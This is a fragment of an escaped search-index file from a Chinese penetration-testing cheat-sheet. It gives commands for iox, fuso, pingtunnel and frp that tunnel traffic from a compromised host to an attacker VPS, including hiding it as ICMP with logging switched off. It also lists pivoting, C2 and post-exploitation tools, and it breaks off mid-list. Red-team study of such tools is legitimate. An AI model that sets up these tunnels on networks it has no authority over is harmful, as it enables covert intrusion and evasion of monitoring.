\u5728\u76ee\u6807\u4e3b\u673a\u6267\u884c(//\u542f\u52a8\u4ee3\u7406\u670d\u52a1\u5e76\u53d1\u9001\u81f3VPS 50054\u7aef\u53e3)\uff1a ./iox proxy -r VPSIP:50054 -k 3211 \u7136\u540e\u672c\u5730socks5\u4ee3\u7406\uff1asocks5://vps:1081 fwd \u672c\u5730\u7aef\u53e3\u8f6c\u53d1 3389 \u81f3VPS: vps\u6267\u884c: nohup ./iox fwd -l *8888 -l 33890 -k 22222 \u76ee\u6807\u673a\u5668\u6267\u884c: iox.exe fwd -r 192.168.0.1:3389 -r *VPSIP:8888 -k 22222 \u968f\u540e\u8fde\u63a5 VPS:33890 \u5373\u53ef\u8bbf\u95ee\u5185\u7f51 3389 fuso Github\uff1ahttps://github.com/editso/fuso socks VPS\uff1a ./fus //\u88ab\u63a7\u673a ./fuc.exe VPSIP 6722 --socks linux\uff1ai686-unknown-linux-musl.zip windows\uff1ax86_64-pc-windows-msvc.zip readme 1. \u7aef\u53e3\u8f6c\u53d1 fuc --forward-host xxx.xxx.xxx.xxx --forward-port --forward-host: \u8f6c\u53d1\u5230\u7684\u5730\u5740 --forward-port: \u8f6c\u53d1\u5230\u7684\u7aef\u53e3 \u5982: \u8f6c\u53d1\u6d41\u91cf\u5230\u5185\u7f51 10.10.10.4:3389 > fuc --forward-host 10.10.10.4 --forward-port 3389 2. socks5: fuc --socks --su --s5p xxx --s5u xxx --su: \u53ef\u9009\u7684, \u5f00\u542fudp\u8f6c\u53d1, --s5p: \u53ef\u9009\u7684, \u8ba4\u8bc1\u5bc6\u7801, \u9ed8\u8ba4\u4e0d\u8fdb\u884c\u5bc6\u7801\u8ba4\u8bc1 --s5u \u53ef\u9009\u7684, \u8ba4\u8bc1\u8d26\u53f7, \u9ed8\u8ba4\u8d26\u53f7 anonymous --socks: \u53ef\u9009\u7684, \u5f00\u542fsocks5\u4ee3\u7406, \u672a\u6307\u5b9a--su\u7684\u60c5\u51b5\u4e0b\u4e0d\u4f1a\u8f6c\u53d1udp \u5982: \u5f00\u542fudp\u8f6c\u53d1\u4e0e\u5bc6\u7801\u8ba4\u8bc1 > fuc --socks --su --s5p 123 --s5u socks \u6b64\u65f6, \u5df2\u5f00\u542fudp\u8f6c\u53d1,\u8fde\u63a5\u5bc6\u7801\u4e3a \"123\",\u8d26\u53f7\u4e3a \"socks\" 3. \u6307\u5b9a\u7a7f\u900f\u6210\u529f\u65f6\u8bbf\u95ee\u7684\u7aef\u53e3 fuc -b xxxx -b | --visit-bind-port: \u53ef\u9009\u7684, \u9ed8\u8ba4\u968f\u673a\u5206\u914d \u5982: \u8bbf\u95ee\u5916\u7f51\u7aef\u53e3 8888 \u8f6c\u53d1\u5230\u5185\u7f51 80 > fuc --forward-port 80 -b 8888 4. \u6865\u63a5\u6a21\u5f0f \u6ce8\u610f: \u76ee\u524d\u4e0d\u80fd\u8f6c\u53d1udp fuc --bridge-listen xxxx --bridge-port xxx --bridge-listen | --bl: \u76d1\u542c\u5730\u5740, \u9ed8\u8ba4 127.0.0.1 --bridge-port | --bp: \u76d1\u542c\u7aef\u53e3, \u9ed8\u8ba4\u4e0d\u542f\u7528\u6865\u63a5 \u5982: \u5f00\u59cb\u6865\u63a5\u6a21\u5f0f,\u5e76\u76d1\u542c\u57289999\u7aef\u53e3, \u672c\u673aip\u5730\u5740\u4e3a: 10.10.10.2 > fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # \u5f00\u542f\u6865\u63a5 > fuc 10.10.10.2 9999 # \u5efa\u7acb\u8fde\u63a5 \u7ea7\u8054: > fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # \u7b2c\u4e00\u7ea7, IP: 10.10.10.2 > fuc --bridge-listen 0.0.0.0 --bridge-port 9991 10.10.10.2 9999 # \u7b2c\u4e8c\u7ea7, IP: 10.10.10.3 > fuc 10.10.10.3 9991 # \u6700\u7ec8 5. \u5c06\u8fde\u63a5\u4fe1\u606f\u901a\u77e5\u5230 Telegram \u6216\u5176\u4ed6 fus --observer \"program:[arguments]\" --observer: \u5efa\u7acb\u8fde\u63a5\u6216\u65ad\u5f00\u8fde\u63a5\u65f6\u7684\u94a9\u5b50 \u5982: \u4f7f\u7528bash\u811a\u672c\u5c06\u8fde\u63a5\u4fe1\u606f\u901a\u77e5\u5230tg > fus --observer \"/bin/bash:[telegram.sh]\" 6. \u6307\u5b9a\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u7684\u7aef\u53e3 fuc --channel-port 8888 ... --channel-port: \u53ef\u9009\u7684, \u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u7aef\u53e3, \u9ed8\u8ba4\u968f\u673a pingtunnel+frp \u642d icmp \u96a7\u9053 pingtunnel \u4e0b\u8f7d\uff1ahttps://oss.ywhack.com/%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93/pingtunnel-2.6 \u88ab\u63a7\u673a nohup ./pingtunnel -type client -l 127.0.0.1:9999 -s vpsip -t vpsip:10000 -sock5 -1 -noprint 1 -nolog 1 >p.log & nohup ./frpc -c frpc.ini > fff.log & pingtunnel -l \u76d1\u542c\u672c\u5730\u76849999\u7aef\u53e3 -s vps\u4e3b\u673aIP -t vps\u4e3b\u673afrp\u670d\u52a1\u7aef\u53e3 \u5ba2\u6237\u7aeffrp\u914d\u7f6e\uff1a [common] server_addr = 127.0.0.1 server_port = 10000 token = PassW0Rd [zhaoshangju_10078] type = tcp remote_port = 10015 plugin = socks5 plugin_user = thIsuserAS plugin_passwd = Passweqwe0Rm use_encryption = true VPS ./pingtunnel -type server ./frps -c frps.ini \u672c\u5730\u4ee3\u7406vps\u7684 10015 \u7aef\u53e3\u52a0\u4e0a\u5bc6\u7801\u5373\u53ef\u4f7f\u7528icmp\u96a7\u9053\u3002 \u53c2\u8003\u6587\u7ae0\uff1ahttps://www.cnblogs.com/cute-puli/p/15213394.html FRP \u5c06 frps \u53ca frps.ini \u653e\u5230\u5177\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u4e0a\u3002 \u5c06 frpc \u53ca frpc.ini \u653e\u5230\u5904\u4e8e\u5185\u7f51\u73af\u5883\u7684\u673a\u5668\u4e0a\u3002 \u5ba2\u6237\u7aef\uff1afrpc -c frpc.ini \u670d\u52a1\u7aef\uff1afrps -c frps.ini Github:https://github.com/fatedier/frp \u4ee3\u7406\u5de5\u5177\u5217\u8868 [2021.03.07] - proxifier \u5168\u5e73\u53f0\u4ee3\u7406\u5de5\u5177\uff0c\u652f\u6301\u591a\u79cdsocks\u534f\u8bae [2021.03.07] - frp \u4e13\u6ce8\u4e8e\u5185\u7f51\u7a7f\u900f\u7684\u9ad8\u6027\u80fd\u7684\u53cd\u5411\u4ee3\u7406\u5e94\u7528 [2021.03.07] - nps \u8f7b\u91cf\u7ea7\u3001\u9ad8\u6027\u80fd\u3001\u529f\u80fd\u5f3a\u5927\u7684\u5185\u7f51\u7a7f\u900f\u4ee3\u7406\u670d\u52a1\u5668 [2021.03.07] - iox \u7aef\u53e3\u8f6c\u53d1 & \u5185\u7f51\u4ee3\u7406\u5de5\u5177 [2021.03.07] - Stowaway \u9762\u5411\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u7684\u591a\u7ea7\u4ee3\u7406\u5de5\u5177 [2021.03.07] - rathole Rust \u7f16\u5199\u7684\u5b89\u5168\u3001\u7a33\u5b9a\u3001\u9ad8\u6027\u80fd\u7684\u5185\u7f51\u7a7f\u900f\u5de5\u5177 [2021.03.07] - rsocx \u4e00\u6b3e\u9ad8\u6027\u80fd\u7684\u652f\u6301\u7ed1\u5b9a/\u53cd\u5411\u4ee3\u7406\u7684 Socks5 \u5de5\u5177 [2021.03.07] - rakshasa \u57fa\u4e8ego\u7f16\u5199\u7684\u8de8\u5e73\u53f0\u3001\u7a33\u5b9a\u3001\u9690\u79d8\u7684\u591a\u7ea7\u4ee3\u7406\u5185\u7f51\u7a7f\u900f\u5de5\u5177 [2021.03.07] - SwitchyOmega \u6d4f\u89c8\u5668\u7684\u4ee3\u7406\u63d2\u4ef6 [2021.03.07] - Neo-reGeorg \u6539\u8fdb\u7684reGeorg\u7248\u672c [2021.03.07] - dns2tcp\u662f\u4e00\u6b3e\u5229\u7528dns\u534f\u8bae\u4f20\u8f93tcp\u6570\u636e\u7684\u5de5\u5177 [2021.03.07] - dnscat2 \u662f\u4e00\u4e2aDNS\u96a7\u9053\u5de5\u5177 [2021.03.07] - ABPTTS \u57fa\u4e8essl\u52a0\u5bc6\u7684http\u96a7\u9053\u5de5\u5177 [2021.03.07] - Termite \u5185\u7f51\u6e17\u900f\u4ee3\u7406\u3001\u7aef\u53e3\u8f6c\u53d1\u5de5\u5177 [2021.03.07] - SSTap, \u4e00\u6b3e\u5229\u7528\u865a\u62df\u7f51\u5361\u5728\u7f51\u7edc\u5c42\u5b9e\u73b0\u7684\u4ee3\u7406\u5de5\u5177 [2021.03.07] - ew \u7528\u4e8e\u5f00\u542f SOCKS v5 \u4ee3\u7406\u670d\u52a1\u7684\u5de5\u5177(\u8de8\u5e73\u53f0) [2021.03.07] - n2n \u5f00\u6e90\u7684\u70b9\u5bf9\u70b9\u7a7f\u900f\u5de5\u5177 [2021.03.07] - Ecloud \u4e00\u6b3e\u57fa\u4e8ehttp/1.1\u534f\u8bae\u4f20\u8f93TCP\u6d41\u91cf\u7684\u5de5\u5177 [2021.03.07] - icmpsh \u4e00\u4e2a\u7b80\u5355\u7684 reverse ICMP shell [2021.03.08] - ngrok \u6b63/\u53cd\u5411\u4ee3\u7406\uff0c\u5185\u7f51\u7a7f\u900f\uff0c\u7aef\u53e3\u8f6c\u53d1 [2021.03.08] - ssf \u5168\u5e73\u53f0\u7684\u52a0\u5bc6\u96a7\u9053 \u7aef\u53e3\u8f6c\u53d1\u5de5\u5177 [2021.03.14] - proxychains \u547d\u4ee4\u884c\u4ee3\u7406\u795e\u5668 [2021.03.14] - switcher \u4e00\u4e2a\u591a\u529f\u80fd\u7684\u7aef\u53e3\u8f6c\u53d1/\u7aef\u53e3\u590d\u7528\u5de5\u5177 [2021.03.22] - pingtunnel \u662f\u628a tcp/udp/sock5 \u6d41\u91cf\u4f2a\u88c5\u6210 icmp \u6d41\u91cf\u8fdb\u884c\u8f6c\u53d1\u7684\u5de5\u5177 [2021.03.26] - chisel - \u4e00\u6b3e\u5feb\u901f\u7a33\u5b9a\u7684\u96a7\u9053\u5de5\u5177 [2021.03.29] - pystinger - \u4e00\u6b3e\u4f7f\u7528webshell\u8fdb\u884c\u6d41\u91cf\u8f6c\u53d1\u7684\u51fa\u7f51\u5de5\u5177 [2021.03.29] - pivotnacci - \u901a\u8fc7HTTP\u4ee3\u7406\u5efa\u7acbsocks\u8fde\u63a5\u7684\u5de5\u5177 [2021.04.06] - lanproxy\u662f\u4e00\u4e2a\u5c06\u5c40\u57df\u7f51\u4e2a\u4eba\u7535\u8111\u3001\u670d\u52a1\u5668\u4ee3\u7406\u5230\u516c\u7f51\u7684\u5185\u7f51\u7a7f\u900f\u5de5\u5177 [2021.04.14] - Venom\u662f\u4e00\u6b3e\u4e3a\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u8bbe\u8ba1\u7684\u4f7f\u7528Go\u5f00\u53d1\u7684\u591a\u7ea7\u4ee3\u7406\u5de5\u5177 [2021.05.07] - goproxy \u4e00\u6b3e\u8f7b\u91cf\u7ea7\u3001\u529f\u80fd\u5f3a\u5927\u3001\u9ad8\u6027\u80fd\u7684\u591a\u79cd\u4ee3\u7406\u5de5\u5177 [2021.05.07] - SCFProxy \u4e00\u4e2a\u57fa\u4e8e\u817e\u8baf\u4e91\u51fd\u6570\u670d\u52a1\u7684\u514d\u8d39\u4ee3\u7406\u6c60 [2021.06.21] - MOSN \u662f\u8fb9\u7f18\u6216\u670d\u52a1\u7f51\u683c\u7684\u4e91\u539f\u751f\u4ee3\u7406\u3002 [2021.06.23] - C2ReverseProxy \u4e00\u6b3e\u53ef\u4ee5\u5728\u4e0d\u51fa\u7f51\u7684\u73af\u5883\u4e0b\u8fdb\u884c\u53cd\u5411\u4ee3\u7406\u53cacs\u4e0a\u7ebf\u7684\u5de5\u5177","title":"proxy tools"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#proxy-tools","text":"","title":"proxy tools"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#iox","text":"\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/EddieIvan01/iox","title":"iox"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#proxy","text":"\u5728\u672c\u5730 0.0.0.0:1080\u542f\u52a8Socks5\u670d\u52a1 ./iox proxy -l 1080 \u52a0\u5bc6\u8f6c\u53d1 socks5 \u4ee3\u7406\uff1a VPS \u76d1\u542c(//\u5c061080\u7aef\u53e3\u76d1\u542c\u5230\u7684\u6d41\u91cf\u8f6c\u53d1\u81f350054\u7aef\u53e3): nohup ./iox proxy -l 50054 -l 1081 -k 3211 > iox.log & \u5728\u76ee\u6807\u4e3b\u673a\u6267\u884c(//\u542f\u52a8\u4ee3\u7406\u670d\u52a1\u5e76\u53d1\u9001\u81f3VPS 50054\u7aef\u53e3)\uff1a ./iox proxy -r VPSIP:50054 -k 3211 \u7136\u540e\u672c\u5730socks5\u4ee3\u7406\uff1asocks5://vps:1081","title":"proxy"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#fwd","text":"\u672c\u5730\u7aef\u53e3\u8f6c\u53d1 3389 \u81f3VPS: vps\u6267\u884c: nohup ./iox fwd -l *8888 -l 33890 -k 22222 \u76ee\u6807\u673a\u5668\u6267\u884c: iox.exe fwd -r 192.168.0.1:3389 -r *VPSIP:8888 -k 22222 \u968f\u540e\u8fde\u63a5 VPS:33890 \u5373\u53ef\u8bbf\u95ee\u5185\u7f51 3389","title":"fwd"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#fuso","text":"Github\uff1ahttps://github.com/editso/fuso","title":"fuso"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#socks","text":"VPS\uff1a ./fus //\u88ab\u63a7\u673a ./fuc.exe VPSIP 6722 --socks linux\uff1ai686-unknown-linux-musl.zip windows\uff1ax86_64-pc-windows-msvc.zip","title":"socks"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#readme","text":"1. \u7aef\u53e3\u8f6c\u53d1 fuc --forward-host xxx.xxx.xxx.xxx --forward-port --forward-host: \u8f6c\u53d1\u5230\u7684\u5730\u5740 --forward-port: \u8f6c\u53d1\u5230\u7684\u7aef\u53e3 \u5982: \u8f6c\u53d1\u6d41\u91cf\u5230\u5185\u7f51 10.10.10.4:3389 > fuc --forward-host 10.10.10.4 --forward-port 3389 2. socks5: fuc --socks --su --s5p xxx --s5u xxx --su: \u53ef\u9009\u7684, \u5f00\u542fudp\u8f6c\u53d1, --s5p: \u53ef\u9009\u7684, \u8ba4\u8bc1\u5bc6\u7801, \u9ed8\u8ba4\u4e0d\u8fdb\u884c\u5bc6\u7801\u8ba4\u8bc1 --s5u \u53ef\u9009\u7684, \u8ba4\u8bc1\u8d26\u53f7, \u9ed8\u8ba4\u8d26\u53f7 anonymous --socks: \u53ef\u9009\u7684, \u5f00\u542fsocks5\u4ee3\u7406, \u672a\u6307\u5b9a--su\u7684\u60c5\u51b5\u4e0b\u4e0d\u4f1a\u8f6c\u53d1udp \u5982: \u5f00\u542fudp\u8f6c\u53d1\u4e0e\u5bc6\u7801\u8ba4\u8bc1 > fuc --socks --su --s5p 123 --s5u socks \u6b64\u65f6, \u5df2\u5f00\u542fudp\u8f6c\u53d1,\u8fde\u63a5\u5bc6\u7801\u4e3a \"123\",\u8d26\u53f7\u4e3a \"socks\" 3. \u6307\u5b9a\u7a7f\u900f\u6210\u529f\u65f6\u8bbf\u95ee\u7684\u7aef\u53e3 fuc -b xxxx -b | --visit-bind-port: \u53ef\u9009\u7684, \u9ed8\u8ba4\u968f\u673a\u5206\u914d \u5982: \u8bbf\u95ee\u5916\u7f51\u7aef\u53e3 8888 \u8f6c\u53d1\u5230\u5185\u7f51 80 > fuc --forward-port 80 -b 8888 4. \u6865\u63a5\u6a21\u5f0f \u6ce8\u610f: \u76ee\u524d\u4e0d\u80fd\u8f6c\u53d1udp fuc --bridge-listen xxxx --bridge-port xxx --bridge-listen | --bl: \u76d1\u542c\u5730\u5740, \u9ed8\u8ba4 127.0.0.1 --bridge-port | --bp: \u76d1\u542c\u7aef\u53e3, \u9ed8\u8ba4\u4e0d\u542f\u7528\u6865\u63a5 \u5982: \u5f00\u59cb\u6865\u63a5\u6a21\u5f0f,\u5e76\u76d1\u542c\u57289999\u7aef\u53e3, \u672c\u673aip\u5730\u5740\u4e3a: 10.10.10.2 > fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # \u5f00\u542f\u6865\u63a5 > fuc 10.10.10.2 9999 # \u5efa\u7acb\u8fde\u63a5 \u7ea7\u8054: > fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # \u7b2c\u4e00\u7ea7, IP: 10.10.10.2 > fuc --bridge-listen 0.0.0.0 --bridge-port 9991 10.10.10.2 9999 # \u7b2c\u4e8c\u7ea7, IP: 10.10.10.3 > fuc 10.10.10.3 9991 # \u6700\u7ec8 5. \u5c06\u8fde\u63a5\u4fe1\u606f\u901a\u77e5\u5230 Telegram \u6216\u5176\u4ed6 fus --observer \"program:[arguments]\" --observer: \u5efa\u7acb\u8fde\u63a5\u6216\u65ad\u5f00\u8fde\u63a5\u65f6\u7684\u94a9\u5b50 \u5982: \u4f7f\u7528bash\u811a\u672c\u5c06\u8fde\u63a5\u4fe1\u606f\u901a\u77e5\u5230tg > fus --observer \"/bin/bash:[telegram.sh]\" 6. \u6307\u5b9a\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u7684\u7aef\u53e3 fuc --channel-port 8888 ... --channel-port: \u53ef\u9009\u7684, \u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u7aef\u53e3, \u9ed8\u8ba4\u968f\u673a","title":"readme"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#pingtunnelfrp-icmp","text":"pingtunnel \u4e0b\u8f7d\uff1ahttps://oss.ywhack.com/%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93/pingtunnel-2.6","title":"pingtunnel+frp \u642d icmp \u96a7\u9053"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#_1","text":"nohup ./pingtunnel -type client -l 127.0.0.1:9999 -s vpsip -t vpsip:10000 -sock5 -1 -noprint 1 -nolog 1 >p.log & nohup ./frpc -c frpc.ini > fff.log & pingtunnel -l \u76d1\u542c\u672c\u5730\u76849999\u7aef\u53e3 -s vps\u4e3b\u673aIP -t vps\u4e3b\u673afrp\u670d\u52a1\u7aef\u53e3 \u5ba2\u6237\u7aeffrp\u914d\u7f6e\uff1a [common] server_addr = 127.0.0.1 server_port = 10000 token = PassW0Rd [zhaoshangju_10078] type = tcp remote_port = 10015 plugin = socks5 plugin_user = thIsuserAS plugin_passwd = Passweqwe0Rm use_encryption = true","title":"\u88ab\u63a7\u673a"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#vps","text":"./pingtunnel -type server ./frps -c frps.ini \u672c\u5730\u4ee3\u7406vps\u7684 10015 \u7aef\u53e3\u52a0\u4e0a\u5bc6\u7801\u5373\u53ef\u4f7f\u7528icmp\u96a7\u9053\u3002 \u53c2\u8003\u6587\u7ae0\uff1ahttps://www.cnblogs.com/cute-puli/p/15213394.html","title":"VPS"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#frp","text":"\u5c06 frps \u53ca frps.ini \u653e\u5230\u5177\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u4e0a\u3002 \u5c06 frpc \u53ca frpc.ini \u653e\u5230\u5904\u4e8e\u5185\u7f51\u73af\u5883\u7684\u673a\u5668\u4e0a\u3002 \u5ba2\u6237\u7aef\uff1afrpc -c frpc.ini \u670d\u52a1\u7aef\uff1afrps -c frps.ini Github:https://github.com/fatedier/frp","title":"FRP"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/#_2","text":"[2021.03.07] - proxifier \u5168\u5e73\u53f0\u4ee3\u7406\u5de5\u5177\uff0c\u652f\u6301\u591a\u79cdsocks\u534f\u8bae [2021.03.07] - frp \u4e13\u6ce8\u4e8e\u5185\u7f51\u7a7f\u900f\u7684\u9ad8\u6027\u80fd\u7684\u53cd\u5411\u4ee3\u7406\u5e94\u7528 [2021.03.07] - nps \u8f7b\u91cf\u7ea7\u3001\u9ad8\u6027\u80fd\u3001\u529f\u80fd\u5f3a\u5927\u7684\u5185\u7f51\u7a7f\u900f\u4ee3\u7406\u670d\u52a1\u5668 [2021.03.07] - iox \u7aef\u53e3\u8f6c\u53d1 & \u5185\u7f51\u4ee3\u7406\u5de5\u5177 [2021.03.07] - Stowaway \u9762\u5411\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u7684\u591a\u7ea7\u4ee3\u7406\u5de5\u5177 [2021.03.07] - rathole Rust \u7f16\u5199\u7684\u5b89\u5168\u3001\u7a33\u5b9a\u3001\u9ad8\u6027\u80fd\u7684\u5185\u7f51\u7a7f\u900f\u5de5\u5177 [2021.03.07] - rsocx \u4e00\u6b3e\u9ad8\u6027\u80fd\u7684\u652f\u6301\u7ed1\u5b9a/\u53cd\u5411\u4ee3\u7406\u7684 Socks5 \u5de5\u5177 [2021.03.07] - rakshasa \u57fa\u4e8ego\u7f16\u5199\u7684\u8de8\u5e73\u53f0\u3001\u7a33\u5b9a\u3001\u9690\u79d8\u7684\u591a\u7ea7\u4ee3\u7406\u5185\u7f51\u7a7f\u900f\u5de5\u5177 [2021.03.07] - SwitchyOmega \u6d4f\u89c8\u5668\u7684\u4ee3\u7406\u63d2\u4ef6 [2021.03.07] - Neo-reGeorg \u6539\u8fdb\u7684reGeorg\u7248\u672c [2021.03.07] - dns2tcp\u662f\u4e00\u6b3e\u5229\u7528dns\u534f\u8bae\u4f20\u8f93tcp\u6570\u636e\u7684\u5de5\u5177 [2021.03.07] - dnscat2 \u662f\u4e00\u4e2aDNS\u96a7\u9053\u5de5\u5177 [2021.03.07] - ABPTTS \u57fa\u4e8essl\u52a0\u5bc6\u7684http\u96a7\u9053\u5de5\u5177 [2021.03.07] - Termite \u5185\u7f51\u6e17\u900f\u4ee3\u7406\u3001\u7aef\u53e3\u8f6c\u53d1\u5de5\u5177 [2021.03.07] - SSTap, \u4e00\u6b3e\u5229\u7528\u865a\u62df\u7f51\u5361\u5728\u7f51\u7edc\u5c42\u5b9e\u73b0\u7684\u4ee3\u7406\u5de5\u5177 [2021.03.07] - ew \u7528\u4e8e\u5f00\u542f SOCKS v5 \u4ee3\u7406\u670d\u52a1\u7684\u5de5\u5177(\u8de8\u5e73\u53f0) [2021.03.07] - n2n \u5f00\u6e90\u7684\u70b9\u5bf9\u70b9\u7a7f\u900f\u5de5\u5177 [2021.03.07] - Ecloud \u4e00\u6b3e\u57fa\u4e8ehttp/1.1\u534f\u8bae\u4f20\u8f93TCP\u6d41\u91cf\u7684\u5de5\u5177 [2021.03.07] - icmpsh \u4e00\u4e2a\u7b80\u5355\u7684 reverse ICMP shell [2021.03.08] - ngrok \u6b63/\u53cd\u5411\u4ee3\u7406\uff0c\u5185\u7f51\u7a7f\u900f\uff0c\u7aef\u53e3\u8f6c\u53d1 [2021.03.08] - ssf \u5168\u5e73\u53f0\u7684\u52a0\u5bc6\u96a7\u9053 \u7aef\u53e3\u8f6c\u53d1\u5de5\u5177 [2021.03.14] - proxychains \u547d\u4ee4\u884c\u4ee3\u7406\u795e\u5668 [2021.03.14] - switcher \u4e00\u4e2a\u591a\u529f\u80fd\u7684\u7aef\u53e3\u8f6c\u53d1/\u7aef\u53e3\u590d\u7528\u5de5\u5177 [2021.03.22] - pingtunnel \u662f\u628a tcp/udp/sock5 \u6d41\u91cf\u4f2a\u88c5\u6210 icmp \u6d41\u91cf\u8fdb\u884c\u8f6c\u53d1\u7684\u5de5\u5177 [2021.03.26] - chisel - \u4e00\u6b3e\u5feb\u901f\u7a33\u5b9a\u7684\u96a7\u9053\u5de5\u5177 [2021.03.29] - pystinger - \u4e00\u6b3e\u4f7f\u7528webshell\u8fdb\u884c\u6d41\u91cf\u8f6c\u53d1\u7684\u51fa\u7f51\u5de5\u5177 [2021.03.29] - pivotnacci - \u901a\u8fc7HTTP\u4ee3\u7406\u5efa\u7acbsocks\u8fde\u63a5\u7684\u5de5\u5177 [2021.04.06] - lanproxy\u662f\u4e00\u4e2a\u5c06\u5c40\u57df\u7f51\u4e2a\u4eba\u7535\u8111\u3001\u670d\u52a1\u5668\u4ee3\u7406\u5230\u516c\u7f51\u7684\u5185\u7f51\u7a7f\u900f\u5de5\u5177 [2021.04.14] - Venom\u662f\u4e00\u6b3e\u4e3a\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u8bbe\u8ba1\u7684\u4f7f\u7528Go\u5f00\u53d1\u7684\u591a\u7ea7\u4ee3\u7406\u5de5\u5177 [2021.05.07] - goproxy \u4e00\u6b3e\u8f7b\u91cf\u7ea7\u3001\u529f\u80fd\u5f3a\u5927\u3001\u9ad8\u6027\u80fd\u7684\u591a\u79cd\u4ee3\u7406\u5de5\u5177 [2021.05.07] - SCFProxy \u4e00\u4e2a\u57fa\u4e8e\u817e\u8baf\u4e91\u51fd\u6570\u670d\u52a1\u7684\u514d\u8d39\u4ee3\u7406\u6c60 [2021.06.21] - MOSN \u662f\u8fb9\u7f18\u6216\u670d\u52a1\u7f51\u683c\u7684\u4e91\u539f\u751f\u4ee3\u7406\u3002 [2021.06.23] - C2ReverseProxy \u4e00\u6b3e\u53ef\u4ee5\u5728\u4e0d\u51fa\u7f51\u7684\u73af\u5883\u4e0b\u8fdb\u884c\u53cd\u5411\u4ee3\u7406\u53cacs\u4e0a\u7ebf\u7684\u5de5\u5177","title":"\u4ee3\u7406\u5de5\u5177\u5217\u8868"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/","text":"\u540e\u6e17\u900f\u5de5\u5177\u5217\u8868 f8x \u4e00\u6b3e\u7ea2/\u84dd\u961f\u73af\u5883\u81ea\u52a8\u5316\u90e8\u7f72\u5de5\u5177,\u652f\u6301\u591a\u79cd\u573a\u666f,\u6e17\u900f,\u5f00\u53d1,\u4ee3\u7406\u73af\u5883,\u670d\u52a1\u53ef\u9009\u9879\u7b49 \u9879\u76ee\u5730\u5740\uff1a https://github.com/ffffffff0x/f8x \u4e2d\u6587\u6587\u6863\uff1a https://github.com/ffffffff0x/f8x/blob/main/README.zh-cn.md Supershell Supershell C2 \u8fdc\u63a7\u5e73\u53f0\uff0c\u57fa\u4e8e\u53cd\u5411SSH\u96a7\u9053\u83b7\u53d6\u5b8c\u5168\u4ea4\u4e92\u5f0fShell \u9879\u76ee\u5730\u5740\uff1a https://github.com/tdragon6/Supershell Viper \u4e92\u8054\u7f51\u653b\u51fb\u9762\u7ba1\u7406&\u7ea2\u961f\u6a21\u62df\u5e73\u53f0 \u9879\u76ee\u5730\u5740\uff1a https://github.com/FunnyWolf/Viper \u5b89\u88c5 or \u4f7f\u7528\u624b\u518c\uff1a https://www.yuque.com/vipersec/install/olg1ua Sliver C2 Sliver C2 \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u8de8\u5e73\u53f0\u7ea2\u961f\u6846\u67b6\u3002 \u9879\u76ee\u5730\u5740\uff1a https://github.com/BishopFox/sliver \u7ea2\u961f\u5de5\u5177\u7814\u7a76\u7bc7 - Sliver C2 Impacket \u5185\u7f51\u6e17\u900f Python \u5de5\u5177\u5305 \u9879\u76ee\u5730\u5740\uff1a 